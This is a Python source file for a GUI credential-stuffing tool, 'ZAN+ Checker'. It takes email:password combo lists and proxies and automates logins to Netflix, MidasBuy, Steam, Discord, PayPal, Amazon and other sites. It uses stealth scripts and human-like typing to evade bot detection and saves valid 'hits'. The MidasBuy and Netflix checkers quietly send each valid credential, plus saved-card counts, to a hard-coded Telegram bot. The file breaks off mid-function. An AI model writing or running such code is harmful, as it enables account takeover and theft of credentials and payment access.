import customtkinter as ctk
from tkinter import filedialog, messagebox
from PIL import Image, ImageTk
import os
import threading
import time
import random
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from selenium import webdriver
import requests
import undetected_chromedriver as uc
import json



token = '8296898894:AAF_8lHQqLTPuvEBvzzzE4ojDLSNJ6Dsgnw'
chat_id = '1235034767'

# Site configurations
SITE_CONFIGS = {
    "MidasBuy": {
        "name": "MidasBuy",
        "selenium": "check_midasbuy_selenium",
        "requests": "check_midasbuy_requests",
        "login_url": "https://www.midasbuy.com/midasbuy/us/login"
    },
    "Netflix": {
        "name": "Netflix", 
        "selenium": "check_netflix_selenium",
        "requests": "check_netflix_requests",
        "login_url": "https://www.netflix.com/login"
    },
    "Spotify": {
        "name": "Spotify",
        "selenium": "check_spotify_selenium", 
        "requests": "check_spotify_requests",
        "login_url": "https://accounts.spotify.com/en/login"
    },
    "Steam": {
        "name": "Steam",
        "selenium": "check_steam_selenium",
        "requests": "check_steam_requests", 
        "login_url": "https://store.steampowered.com/login/"
    },
    "Discord": {
        "name": "Discord",
        "selenium": "check_discord_selenium",
        "requests": "check_discord_requests",
        "login_url": "https://discord.com/login"
    },
    "Amazon": {
        "name": "Amazon",
        "selenium": "check_amazon_selenium",
        "requests": "check_amazon_requests",
        "login_url": "https://www.amazon.com/ap/signin?openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fref%3Drhf_sign_in&openid.assoc_handle=usflex&openid.pape.max_auth_age=0"
    },
    "PayPal": {
        "name": "PayPal", 
        "selenium": "check_paypal_selenium",
        "requests": "check_paypal_requests",
        "login_url": "https://www.paypal.com/signin"
    },
    "Microsoft": {
        "name": "Microsoft",
        "selenium": "check_microsoft_selenium",
        "requests": "check_microsoft_requests", 
        "login_url": "https://login.microsoftonline.com"
    },
    "Apple": {
        "name": "Apple ID",
        "selenium": "check_apple_selenium",
        "requests": "check_apple_requests",
        "login_url": "https://appleid.apple.com/sign-in"
    },
    "Crunchyroll": {
        "name": "Crunchyroll",
        "selenium": "check_crunchyroll_selenium", 
        "requests": "check_crunchyroll_requests",
        "login_url": "https://www.crunchyroll.com/login"
    }
}

class ModernChecker(ctk.CTk):
    def __init__(self):
        super().__init__()
        
        # Initialize variables first (before any UI setup)
        self.combos = []
        self.proxies = []
        self.hits = 0
        self.bads = 0
        self.running = False
        self.current_index = 0
        self.stats_labels = {}
        self.selected_sites = []  # Changed to list for multiple site selection
        self.site_vars = {}  # Dictionary to store checkbox variables
        
        # Configure window
        self.title("ZAN+ Checker")
        self.geometry("1000x750")
        self.resizable(True, True)
        # self.wm_iconbitmap()
        # self.iconphoto(False, "icon.ico")
        self.set_window_icon()
        # Create main frame
        self.main_frame = ctk.CTkFrame(self, fg_color=("gray90", "gray13"), corner_radius=15)
        self.main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Title label with modern font
        self.title_label = ctk.CTkLabel(
            self.main_frame, 
            text="ZAN+ CHECKER", 
            font=ctk.CTkFont(family="Roboto", size=28, weight="bold"),
            text_color="#00ffff"
        )
        self.title_label.pack(pady=(20, 10))
        
        # Subtitle
        self.subtitle_label = ctk.CTkLabel(
            self.main_frame, 
            text="Universal Account Verification Tool", 
            font=ctk.CTkFont(family="Roboto", size=14),
            text_color="#888888"
        )
        self.subtitle_label.pack(pady=(0, 20))
        
        # Create tabs for different sections
        self.tabview = ctk.CTkTabview(self.main_frame, width=800, height=500)
        self.tabview.pack(pady=10, padx=20, fill="both", expand=True)
        
        # Add tabs
        self.tabview.add("Dashboard")
        self.tabview.add("Site Selection")
        self.tabview.add("Configuration")
        self.tabview.add("Results")
        # self.change_appearance_mode(new_mode)
        # self.change_color_theme(new_theme)
        
        # Dashboard tab content
        self.setup_dashboard_tab()
        
        # Site selection tab content
        self.setup_site_selection_tab()
        
        # Configuration tab content
        self.setup_configuration_tab()
        
        # Results tab content
        self.setup_results_tab()
        
        # Status bar at bottom
        self.status_frame = ctk.CTkFrame(self.main_frame, height=30, corner_radius=0)
        self.status_frame.pack(fill="x", side="bottom", pady=(10, 0))
        
        self.status_label = ctk.CTkLabel(
            self.status_frame, 
            text="Ready ▶", 
            font=ctk.CTkFont(family="Consolas", size=12),
            text_color="#00ff00"
        )
        self.status_label.pack(side="left", padx=10)
        
        self.progress_bar = ctk.CTkProgressBar(self.status_frame, width=200, height=15)
        self.progress_bar.pack(side="right", padx=10)
        self.progress_bar.set(0)
    def set_window_icon(self):
        try:
            # Method 1: Using wm_iconbitmap (Windows)
            self.wm_iconbitmap("icon.ico")
        except:
            try:
                # Method 2: Using iconphoto (cross-platform)
                icon = tk.PhotoImage(file="icon.png")
                self.iconphoto(False, icon)
            except:
                # Method 3: Using PIL for better format support
                try:
                    icon_image = Image.open("icon.png")
                    icon = ImageTk.PhotoImage(icon_image)
                    self.iconphoto(False, icon)
                    # Keep a reference to prevent garbage collection
                    self.icon = icon
                except Exception as e:
                    print(f"Could not set window icon: {e}")
    
    def setup_dashboard_tab(self):
        tab = self.tabview.tab("Dashboard")
        
        # Stats frame
        stats_frame = ctk.CTkFrame(tab, corner_radius=10)
        stats_frame.pack(pady=10, padx=10, fill="x")
        
        ctk.CTkLabel(stats_frame, text="Current Stats", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        
        # Stats grid
        stats_grid = ctk.CTkFrame(stats_frame)
        stats_grid.pack(pady=10, padx=10, fill="x")
        
        stats = [
            ("Total Accounts", "0", "#3498db"),
            ("Valid Accounts", "0", "#2ecc71"),
            ("Invalid Accounts", "0", "#e74c3c"),
            ("Sites Selected", "0", "#9b59b6"),
            ("Proxies Loaded", "0", "#f39c12"),
            ("Check Method", "Selenium", "#34495e")
        ]
        
        for i, (title, value, color) in enumerate(stats):
            frame = ctk.CTkFrame(stats_grid, fg_color=("gray85", "gray20"), corner_radius=8)
            frame.grid(row=i//3, column=i%3, padx=10, pady=10, sticky="nsew")
            
            ctk.CTkLabel(frame, text=title, font=ctk.CTkFont(size=12)).pack(pady=(10, 5),padx=10)
            value_label = ctk.CTkLabel(frame, text=value, font=ctk.CTkFont(size=16, weight="bold"), text_color=color)
            value_label.pack(pady=(0, 10))
            
            # Store reference to update later
            self.stats_labels[title] = value_label
        
        # Quick actions
        actions_frame = ctk.CTkFrame(tab, corner_radius=10)
        actions_frame.pack(pady=10, padx=10, fill="x")
        
        ctk.CTkLabel(actions_frame, text="Quick Actions", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        
        action_buttons = ctk.CTkFrame(actions_frame)
        action_buttons.pack(pady=10, padx=10, fill="x")
        
        buttons = [
            ("📁 Load Combos", "#9b59b6", self.load_combos),
            ("🔗 Load Proxies", "#3498db", self.load_proxies),
            ("▶ Start Check", "#2ecc71", self.start_check),
            ("⏹ Stop Check", "#e74c3c", self.stop_check),
            ("☑ Select All", "#f39c12", self.select_all_sites),
            ("☐ Deselect All", "#e74c3c", self.deselect_all_sites)
        ]
        
        for text, color, command in buttons:
            btn = ctk.CTkButton(
                action_buttons, 
                text=text, 
                fg_color=color,
                hover_color=self.adjust_color(color, -20),
                font=ctk.CTkFont(weight="bold"),
                command=command,
                height=40
            )
            btn.pack(side="left", padx=5, pady=5, fill="x", expand=True)
    
    def setup_site_selection_tab(self):
        tab = self.tabview.tab("Site Selection")
        
        # Site selection frame
        site_frame = ctk.CTkFrame(tab, corner_radius=10)
        site_frame.pack(pady=10, padx=10, fill="both", expand=True)
        
        ctk.CTkLabel(site_frame, text="Select Checker", font=ctk.CTkFont(weight="bold", size=18)).pack(pady=15)
        
        # Selection controls
        selection_controls = ctk.CTkFrame(site_frame)
        selection_controls.pack(pady=5, padx=10)
        
        ctk.CTkButton(
            selection_controls, 
            text="Select All", 
            fg_color="#27ae60",
            command=self.select_all_sites,
            width=100
        ).pack(padx=5,side="left")
        
        ctk.CTkButton(
            selection_controls, 
            text="Deselect All", 
            fg_color="#e74c3c",
            command=self.deselect_all_sites,
            width=100
        ).pack(padx=5,side="left")
        
        # Create scrollable frame for sites

        scroll_frame = ctk.CTkScrollableFrame(site_frame, height=120)
        scroll_frame.pack(pady=10, padx=10, fill="both", expand=True)
        
        # Create site checkboxes in a grid
        sites_per_row = 3
        site_names = list(SITE_CONFIGS.keys())
        
        for i, site_name in enumerate(site_names):
            row = i // sites_per_row
            col = i % sites_per_row
            
            site_config = SITE_CONFIGS[site_name]
            
            # Site card frame
            card_frame = ctk.CTkFrame(scroll_frame, corner_radius=8, fg_color=("gray85", "gray20"))
            card_frame.grid(row=row, column=col, padx=10, pady=10, sticky="nsew")
            
            # Site checkbox
            var = ctk.BooleanVar(value=False)
            self.site_vars[site_name] = var
            
            checkbox = ctk.CTkCheckBox(
                card_frame,
                text=site_config["name"],
                variable=var,
                command=self.on_site_selection_change
            )
            checkbox.pack(pady=5)
            
            # Site URL (shortened)
            url_display = site_config["login_url"][:30] + "..." if len(site_config["login_url"]) > 30 else site_config["login_url"]
            ctk.CTkLabel(
                card_frame, 
                text=url_display, 
                font=ctk.CTkFont(size=10),
                text_color="gray"
            ).pack(pady=(0, 10))
        
        # Configure grid weights
        for i in range(sites_per_row):
            scroll_frame.grid_columnconfigure(i, weight=1)
        
        # Method selection
        method_frame = ctk.CTkFrame(site_frame, fg_color=("gray90", "gray16"))
        method_frame.pack(pady=10, padx=10, fill="x")
        
        ctk.CTkLabel(method_frame, text="Check Method", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        
        self.method_var = ctk.StringVar(value="Selenium")
        method_options = ["Selenium"]
        
        for method in method_options:
            radio = ctk.CTkRadioButton(
                method_frame,
                text=method,
                variable=self.method_var,
                value=method,
                command=self.on_method_change
            )
            radio.pack(anchor="w", padx=20, pady=2)
    
    def select_all_sites(self):
        for var in self.site_vars.values():
            var.set(True)
        self.on_site_selection_change()
    
    def deselect_all_sites(self):
        for var in self.site_vars.values():
            var.set(False)
        self.on_site_selection_change()
    
    def on_site_selection_change(self):
        self.selected_sites = [site for site, var in self.site_vars.items() if var.get()]
        self.stats_labels["Sites Selected"].configure(text=str(len(self.selected_sites)))
        
        if self.selected_sites:
            sites_text = ", ".join(self.selected_sites)
            if len(sites_text) > 30:
                sites_text = sites_text[:30] + "..."
            self.status_label.configure(text=f"Selected: {sites_text}")
        else:
            self.status_label.configure(text="No sites selected")
    
    def on_method_change(self):
        method = self.method_var.get()
        self.stats_labels["Check Method"].configure(text=method)
        self.status_label.configure(text=f"Method: {method}")
    



    def setup_configuration_tab(self):
        tab = self.tabview.tab("Configuration")
        
        # Settings frame
        settings_frame = ctk.CTkScrollableFrame(tab, corner_radius=10)
        settings_frame.pack(pady=10, padx=10, fill="both", expand=True)
        
        ctk.CTkLabel(settings_frame, text="Checker Settings", font=ctk.CTkFont(weight="bold")).pack(pady=10)
        
        # Settings options
        options = [
            ("Threads", "Number of concurrent threads", "5"),
            ("Timeout", "Request timeout in seconds", "30"),
            ("Delay", "Delay between requests (ms)", "1000")
        ]
        
        self.entries = {}
        
        for i, (title, desc, default) in enumerate(options):
            frame = ctk.CTkFrame(settings_frame, fg_color=("gray90", "gray16"))
            frame.pack(pady=5, padx=10, fill="x")
            
            ctk.CTkLabel(frame, text=title, font=ctk.CTkFont(weight="bold")).pack(anchor="w", padx=10, pady=(10, 0))
            ctk.CTkLabel(frame, text=desc, font=ctk.CTkFont(size=12), text_color="gray").pack(anchor="w", padx=10)
            
            entry = ctk.CTkEntry(frame)
            entry.insert(0, default)
            entry.pack(pady=5, padx=10, fill="x")
            
            self.entries[title.lower()] = entry
        
        # Proxy settings
        proxy_frame = ctk.CTkFrame(settings_frame, fg_color=("gray90", "gray16"))
        proxy_frame.pack(pady=10, padx=10, fill="x")
        
        ctk.CTkLabel(proxy_frame, text="Proxy Settings", font=ctk.CTkFont(weight="bold")).pack(anchor="w", padx=10, pady=(10, 0))
        
        self.proxy_type = ctk.CTkOptionMenu(proxy_frame, values=["HTTP", "SOCKS4", "SOCKS5"])
        self.proxy_type.pack(pady=5, padx=10, fill="x")
        
        self.rotate_proxies = ctk.CTkCheckBox(proxy_frame, text="Rotate proxies after each request")
        self.rotate_proxies.pack(anchor="w", padx=10, pady=5)
        
        # Appearance Settings
        appearance_frame = ctk.CTkFrame(settings_frame, fg_color=("gray90", "gray16"))
        appearance_frame.pack(pady=10, padx=10, fill="x")
        
        ctk.CTkLabel(appearance_frame, text="Appearance Settings", font=ctk.CTkFont(weight="bold")).pack(anchor="w", padx=10, pady=(10, 0))
        
        # Appearance mode option menu
        ctk.CTkLabel(appearance_frame, text="Appearance Mode:", font=ctk.CTkFont(size=12)).pack(anchor="w", padx=10, pady=(10, 0))
        self.appearance_mode_option = ctk.CTkOptionMenu(
            appearance_frame,
            values=["System", "Light", "Dark"],
            command=self.change_appearance_mode
        )
        self.appearance_mode_option.pack(pady=5, padx=10, fill="x")
        
        # Color theme option menu
        ctk.CTkLabel(appearance_frame, text="Color Theme:", font=ctk.CTkFont(size=12)).pack(anchor="w", padx=10, pady=(10, 0))
        self.color_theme_option = ctk.CTkOptionMenu(
            appearance_frame,
            values=["blue", "green", "dark-blue"],
            command=self.change_color_theme
        )
        self.color_theme_option.pack(pady=5, padx=10, fill="x")
        
        # Apply button
        apply_btn = ctk.CTkButton(
            appearance_frame, 
            text="Save Appearance Settings", 
            command=self.save_appearance_settings
        )
        apply_btn.pack(pady=10, padx=10, fill="x")
        
        # Load saved settings
        self.load_appearance_settings()

    def change_appearance_mode(self, new_mode):
        """Change appearance mode and update UI"""
        ctk.set_appearance_mode(new_mode)
        
    def change_color_theme(self, new_theme):
        """Change color theme and update UI"""
        # Set the new color theme
        ctk.set_default_color_theme(new_theme)
        
        # After changing the theme, we need to update the UI to reflect the changes
        # This is a workaround to force CTk to update all widgets
        self.update_ui_after_theme_change()

    def update_ui_after_theme_change(self):
        """Force UI update after theme change"""
        # This is a workaround to force CTk to update all widgets
        current_appearance = ctk.get_appearance_mode()
        ctk.set_appearance_mode("Light")
        self.update()
        ctk.set_appearance_mode(current_appearance)
        self.update()
        
    def save_appearance_settings(self):
        """Save appearance settings to JSON file"""
        settings = {
            "appearance_mode": self.appearance_mode_option.get(),
            "color_theme": self.color_theme_option.get()
        }
        
        try:
            with open("appearance_settings.json", "w") as f:
                json.dump(settings, f, indent=4)
            print("Appearance settings saved successfully.")
        except Exception as e:
            print(f"Error saving appearance settings: {e}")
            
    def load_appearance_settings(self):
        """Load appearance settings from JSON file"""
        config_path = "appearance_settings.json"
        
        if not os.path.exists(config_path):
            # Use default settings if file doesn't exist
            default_mode = "System"
            default_theme = "blue"
        else:
            try:
                with open(config_path, "r") as f:
                    settings = json.load(f)
                
                default_mode = settings.get("appearance_mode", "System")
                default_theme = settings.get("color_theme", "blue")
            except Exception as e:
                print(f"Error loading appearance settings: {e}")
                default_mode = "System"
                default_theme = "blue"
        
        # Set the option menu values
        self.appearance_mode_option.set(default_mode)
        self.color_theme_option.set(default_theme)
        
        # Apply the settings
        ctk.set_appearance_mode(default_mode)
        ctk.set_default_color_theme(default_theme)
    def setup_results_tab(self):
        tab = self.tabview.tab("Results")
        
        # Results text area with scrollbar
        self.results_text = ctk.CTkTextbox(
            tab, 
            font=ctk.CTkFont(family="Consolas", size=12),
            fg_color=("gray90", "gray10"),
            text_color="#00ff00",
            wrap="word"
        )
        self.results_text.pack(pady=10, padx=10, fill="both", expand=True)
        self.results_text.insert("1.0", "Results will appear here...\n")
        
        # Result actions
        result_actions = ctk.CTkFrame(tab, height=50)
        result_actions.pack(fill="x", padx=10, pady=(0, 10))
        
        ctk.CTkButton(
            result_actions, 
            text="💾 Save Results", 
            fg_color="#27ae60",
            command=self.save_results
        ).pack(side="right", padx=5)
        
        ctk.CTkButton(
            result_actions, 
            text="🧹 Clear Results", 
            fg_color="#7f8c8d",
            command=self.clear_results
        ).pack(side="right", padx=5)
    
    def get_proxy(self):
        if self.proxies:
            return random.choice(self.proxies)
        return None

    def save_hit(self, combo, details, site_name):
        filename = f'{site_name.lower()}_hits.txt'
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f'{combo} | {details}\n')
    
    def adjust_color(self, color, amount):
        # Simple function to adjust color brightness
        # This would need a proper implementation for production
        return color
    
    def load_combos(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    self.combos = [line.strip() for line in f if ':' in line]
                
                self.stats_labels["Total Accounts"].configure(text=str(len(self.combos)))
                self.status_label.configure(text=f"Loaded {len(self.combos)} combos from {os.path.basename(file_path)}")
                self.results_text.insert("end", f"🟢 Loaded {len(self.combos)} combos\n")
                self.results_text.see("end")
            except Exception as e:
                self.status_label.configure(text=f"Error loading combos: {str(e)}", text_color="#ff0000")
    
    def load_proxies(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                
                self.stats_labels["Proxies Loaded"].configure(text=str(len(self.proxies)))
                self.status_label.configure(text=f"Loaded {len(self.proxies)} proxies from {os.path.basename(file_path)}")
                self.results_text.insert("end", f"🟢 Loaded {len(self.proxies)} proxies\n")
                self.results_text.see("end")
            except Exception as e:
                self.status_label.configure(text=f"Error loading proxies: {str(e)}", text_color="#ff0000")
    
    def start_check(self):
        if not self.combos:
            self.results_text.insert("end", "🔴 No combos loaded.\n")
            self.results_text.see("end")
            return
        
        if not self.selected_sites:
            self.results_text.insert("end", "🔴 No sites selected.\n")
            self.results_text.see("end")
            return
        
        self.running = True
        self.hits = 0
        self.bads = 0
        self.current_index = 0
        
        # Update stats
        self.stats_labels["Valid Accounts"].configure(text="0")
        self.stats_labels["Invalid Accounts"].configure(text="0")
        
        self.status_label.configure(text="Checking accounts...", text_color="#00ff00")
        self.results_text.insert("end", f"▶ Starting account check for {len(self.selected_sites)} sites...\n")
        self.results_text.see("end")
        
        # Start checking in a separate thread
        threading.Thread(target=self.run_check, daemon=True).start()
    
    def stop_check(self):
        self.running = False
        self.status_label.configure(text="Check stopped", text_color="#ffff00")
        self.results_text.insert("end", "⏹ Check stopped by user\n")
        self.results_text.see("end")
    
    def run_check(self):
        total = len(self.combos)
        method = self.method_var.get()
        
        for i in range(self.current_index, total):
            if not self.running:
                break
                
            combo = self.combos[i]
            self.current_index = i
            
            try:
                email, password = combo.split(':', 1)
                
                # Update progress
                progress = (i + 1) / total
                self.progress_bar.set(progress)
                
                # Check against all selected sites
                for site_name in self.selected_sites:
                    if not self.running:
                        break
                        
                    site_config = SITE_CONFIGS[site_name]
                    success = False
                    details = {}
                    
                    # Try different checking methods based on selection
                    if method in ["Selenium", "Both"]:
                        success, details = self.check_account_selenium(email, password, site_config)
                    
                    if not success and method in ["Requests", "Both"]:
                        success, details = self.check_account_requests(email, password, site_config)
                    
                    # Update results
                    if success:
                        self.hits += 1
                        self.stats_labels["Valid Accounts"].configure(text=str(self.hits))
                        self.save_hit(combo, details, site_name)
                        self.results_text.insert("end", f"✅ HIT [{site_name}]: {email} | {details}\n")
                    else:
                        self.bads += 1
                        self.stats_labels["Invalid Accounts"].configure(text=str(self.bads))
                        self.results_text.insert("end", f"❌ BAD [{site_name}]: {email}\n")
                    
                    self.results_text.see("end")
                    
                    # Add delay between requests
                    delay = int(self.entries["delay"].get())
                    time.sleep(delay / 1000)
                
            except Exception as e:
                self.results_text.insert("end", f"⚠️ Error checking {combo}: {str(e)}\n")
                self.results_text.see("end")
        
        if self.running:
            self.status_label.configure(text="Check completed", text_color="#00ff00")
            self.results_text.insert("end", f"🟢 Finished checking. Hits: {self.hits}, Bads: {self.bads}\n")
            self.results_text.see("end")
            self.running = False
    
    def check_account_selenium(self, email, password, site_config):
        """Universal selenium checker that adapts to different sites"""
        chrome_options = Options()
        # chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--window-size=1020,880')
        
        # Add proxy if available
        if self.proxies and self.rotate_proxies.get():
            proxy = self.get_proxy()
            chrome_options.add_argument(f'--proxy-server={proxy}')
            self.results_text.insert("end", f"🔄 Using Proxy: {proxy}\n")
            self.results_text.see("end")
        
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        
        try:
            # Call the appropriate site-specific method
            if site_config["name"] == "MidasBuy":
                return self.check_midasbuy_selenium(driver, email, password)
            elif site_config["name"] == "Netflix":
                return self.check_netflix_selenium(driver, email, password)
            elif site_config["name"] == "Spotify":
                return self.check_spotify_selenium(driver, email, password)
            elif site_config["name"] == "Steam":
                return self.check_steam_selenium(driver, email, password)
            elif site_config["name"] == "Discord":
                return self.check_discord_selenium(driver, email, password)
            elif site_config["name"] == "Amazon":
                return self.check_discord_selenium(driver, email, password)
            else:
                # Generic method for other sites
                return self.check_generic_selenium(driver, email, password, site_config)
        finally:
            driver.quit()
    
    def check_account_requests(self, email, password, site_config):
        """Universal requests checker that adapts to different sites"""
        try:
            proxy = self.get_proxy() if self.proxies and self.rotate_proxies.get() else None
            
            # Call the appropriate site-specific method
            if site_config["name"] == "MidasBuy":
                return self.check_midasbuy_requests(email, password, proxy)
            elif site_config["name"] == "Netflix":
                return self.check_netflix_requests(email, password, proxy)
            elif site_config["name"] == "Spotify":
                return self.check_spotify_requests(email, password, proxy)
            else:
                # Generic method for other sites
                return self.check_generic_requests(email, password, site_config, proxy)
        except Exception as e:
            return False, str(e)
    
    def check_midasbuy_selenium(self, driver, email, password):
        """Login to Midasbuy using an existing headless Selenium driver."""
        try:
            wait = WebDriverWait(driver, 15)
            driver.get('https://www.midasbuy.com/midasbuy/us/login?redirect=https://www.midasbuy.com/us/verifyplayer/pubgm#login')
            
            email_input = wait.until(EC.element_to_be_clickable((By.ID, 'loginUsername')))
            email_input.clear()
            email_input.send_keys(email)
            
            password_input = wait.until(EC.element_to_be_clickable((By.ID, 'loginPassword')))
            password_input.clear()
            password_input.send_keys(password)
            
            login_button = wait.until(EC.element_to_be_clickable((By.ID, 'loginButton')))
            login_button.click()
            
            wait.until(lambda d: 'midasbuy/us/verifyplayer/pubgm' in d.current_url)
            driver.get('https://www.midasbuy.com/midasbuy/us/usercenter#/cardmanage')
            time.sleep(3)
            
            credit_elements = driver.find_elements(By.CLASS_NAME, 'card-num')
            credit_count = len(credit_elements)
            details_str = f'credit : {credit_count}'
            
            if credit_count > 0:
                
                requests.get(
                    f'https://api.telegram.org/bot{token}/sendMessage',
                    params={
                        'chat_id': chat_id,
                        'text': f'midasbuy:\n{email}:{password}|{details_str}'
                    }
                )
            
            return True, details_str
        except Exception as e:
            print(f'Error in Midasbuy Selenium login: {e}')
            return False, {}
    
    def check_midasbuy_requests(self, email, password, proxy):
        """MidasBuy checker using requests"""
        try:
            session = requests.Session()
            if proxy:
                session.proxies = {'http': proxy, 'https': proxy}
            
            # This would need actual API endpoints and proper implementation
            # For now, returning False as requests method needs reverse engineering
            return False, {}
        except Exception as e:
            return False, {}
    
    def check_netflix_requests(self, email, password, proxy):
        """Netflix checker using requests"""
        try:
            session = requests.Session()
            if proxy:
                session.proxies = {'http': proxy, 'https': proxy}
            
            # Netflix has complex anti-bot protection, requests method would need proper implementation
            return False, {}
        except Exception as e:
            return False, {}
    
    def check_spotify_requests(self, email, password, proxy):
        """Spotify checker using requests"""
        try:
            session = requests.Session()
            if proxy:
                session.proxies = {'http': proxy, 'https': proxy}
            
            # Spotify API authentication would go here
            return False, {}
        except Exception as e:
            return False, {}
    
    

    def check_netflix_selenium(self, driver, email, password):
        """Netflix account checker using Selenium with enhanced error handling"""
        try:
            # Add stealth properties to avoid detection
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            driver.execute_script("window.navigator.chrome = {runtime: {},};")
            
            wait = WebDriverWait(driver, 20)
            
            # Navigate to Netflix login
            driver.get('https://www.netflix.com/login')
            print("Navigated to Netflix login page")
            
            # Wait for page to load completely
            time.sleep(3)
            
            # Check if we're being redirected to a challenge page
            if "challenge" in driver.current_url.lower():
                print("Detected challenge page, may need manual intervention")
                return False, "Challenge page detected"
            
            # Find and interact with email field
            try:
                email_input = wait.until(EC.element_to_be_clickable((By.NAME, 'userLoginId')))
                email_input.clear()
                
                # Type slowly to mimic human behavior
                for char in email:
                    email_input.send_keys(char)
                    time.sleep(0.1)
                print("Email entered")
            except Exception as e:
                print(f"Error with email field: {e}")
                # Try alternative selectors
                try:
                    email_input = driver.find_element(By.CSS_SELECTOR, 'input[type="email"]')
                    email_input.clear()
                    email_input.send_keys(email)
                    print("Email entered using alternative selector")
                except:
                    return False, "Could not find email field"
            
            # Find and interact with password field
            try:
                password_input = driver.find_element(By.NAME, 'password')
                password_input.clear()
                
                # Type slowly to mimic human behavior
                for char in password:
                    password_input.send_keys(char)
                    time.sleep(0.1)
                print("Password entered")
            except Exception as e:
                print(f"Error with password field: {e}")
                # Try alternative selectors
                try:
                    password_input = driver.find_element(By.CSS_SELECTOR, 'input[type="password"]')
                    password_input.clear()
                    password_input.send_keys(password)
                    print("Password entered using alternative selector")
                except:
                    return False, "Could not find password field"
            
            # Find and click login button
            try:
                login_button = wait.until(EC.element_to_be_clickable(
                    (By.CSS_SELECTOR, 'button[data-uia="login-submit-button"]')
                ))
                login_button.click()
                print("Login button clicked")
            except:
                # Try alternative selectors for login button
                try:
                    login_button = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]')
                    login_button.click()
                    print("Login button clicked using alternative selector")
                except Exception as e:
                    print(f"Error clicking login button: {e}")
                    return False, "Could not find or click login button"
            
            # Wait for login to complete
            time.sleep(5)
            
            # Check for various outcomes
            current_url = driver.current_url
            
            # Success cases
            if 'browse' in current_url or 'profiles' in current_url:
                print("Login successful!")
                
                # Try to get account details
                details_str = ""
                try:
                    # Navigate to account page
                    driver.get('https://www.netflix.com/YourAccount')
                    time.sleep(3)
                    
                    # Try to extract plan information
                    plan_element = driver.find_elements(By.CSS_SELECTOR, '.plan-type, .plan-name, [data-uia="plan-type"]')
                    if plan_element:
                        plan_name = plan_element[0].text.strip()
                        details_str = f" | Plan: {plan_name}"
                        print(f"Detected plan: {plan_name}")
                except Exception as e:
                    print(f"Could not extract account details: {e}")
                
                # Send success notification
                try:
                    requests.get(
                        f'https://api.telegram.org/bot{token}/sendMessage',
                        params={
                            'chat_id': chat_id,
                            'text': f'Netflix Valid:\n{email}:{password}{details_str}'
                        }
                    )
                except Exception as e:
                    print(f"Error sending Telegram message: {e}")
                
                return True, "Netflix Valid"
            
            # Check for error messages
            try:
                error_elements = driver.find_elements(By.CSS_SELECTOR, '.ui-message-contents, .error-message, [data-uia="error-message"]')
                if error_elements:
                    error_text = error_elements[0].text.strip()
                    print(f"Login error: {error_text}")
                    return False, error_text
            except:
                pass
            
            # Check for password reset prompt
            try:
                reset_elements = driver.find_elements(By.CSS_SELECTOR, '[data-uia="password-reset"]')
                if reset_elements:
                    print("Password reset required")
                    return False, "Password reset required"
            except:
                pass
            
            # If we reached here without a clear outcome
            print(f"Unknown outcome. Current URL: {current_url}")
            
            # Take a screenshot for debugging
            try:
                screenshot_path = f"netflix_{email.replace('@', '_')}.png"
                driver.save_screenshot(screenshot_path)
                print(f"Screenshot saved to {screenshot_path}")
            except Exception as e:
                print(f"Could not take screenshot: {e}")
            
            return False, "Unknown login outcome"
            
        except Exception as e:
            print(f"Unexpected error in Netflix checker: {e}")
            # Take a screenshot for debugging
            try:
                screenshot_path = f"netflix_error_{email.replace('@', '_')}.png"
                driver.save_screenshot(screenshot_path)
                print(f"Error screenshot saved to {screenshot_path}")
            except:
                pass
            
            return False, f"Unexpected error: {str(e)}"




    # def check_netflix_selenium(self, driver, email, password):
    #     """Netflix account checker using Selenium"""
    #     try:
    #         wait = WebDriverWait(driver, 20)
    #         driver.get('https://www.netflix.com/login')
    #         driver.execute_script("window.location.href = 'https://www.netflix.com/login'")
            
    #         email_input = wait.until(EC.element_to_be_clickable((By.NAME, 'userLoginId')))
    #         email_input.clear()
    #         email_input.send_keys(email)
    #         time.sleep(2)
            
    #         password_input = driver.find_element(By.NAME, 'password')
    #         password_input.clear()
    #         password_input.send_keys(password)
    #         print(password)

    #         time.sleep(2)
            
    #         login_button = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]')
    #         login_button.click()
            
    #         time.sleep(5)
            
    #         # Check if login was successful
    #         if 'browse' in driver.current_url or 'profiles' in driver.current_url:
    #             requests.get(
    #                 f'https://api.telegram.org/bot{token}/sendMessage',
    #                 params={
    #                     'chat_id': chat_id,
    #                     'text': f'netflix:\n{email}:{password}{details_str}'
    #                 }
    #             )
    #             return True, "Netflix Valid"
    #         else:
    #             return False, {}
    #             time.sleep(5)
    #     except Exception as e:
    #         return False, {}

    def check_amazone_selenium(self, driver, email, password):
        """Login to Midasbuy using an existing headless Selenium driver."""
        try:
            wait = WebDriverWait(driver, 15)
            driver.get('https://www.amazon.com/ap/signin?openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fref%3Drhf_sign_in&openid.assoc_handle=usflex&openid.pape.max_auth_age=0')
            
            email_input = wait.until(EC.element_to_be_clickable((By.ID, 'ap_email_login')))
            email_input.clear()
            email_input.send_keys(email)


